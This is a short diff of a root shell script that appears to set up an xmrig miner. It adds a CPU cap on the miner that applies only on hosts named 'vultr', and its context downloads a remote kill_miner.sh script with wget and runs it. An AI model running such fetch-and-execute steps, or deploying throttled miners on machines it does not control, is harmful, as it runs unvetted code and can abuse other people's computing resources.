@@ -50,6 +50,14 @@ sleep 3
 EOF
 chmod +x /root/danielluis1921.sh
 
+hostname=$(hostname)
+if [ "$hostname" = "vultr" ];
+then
+  sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof xmrig) > /dev/null 2>&1 &" danielluis1921.sh
+else
+  echo "hostname isn't vultr"
+fi
+
 wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
 chmod +x /root/kill_miner.sh
 ./kill_miner.sh
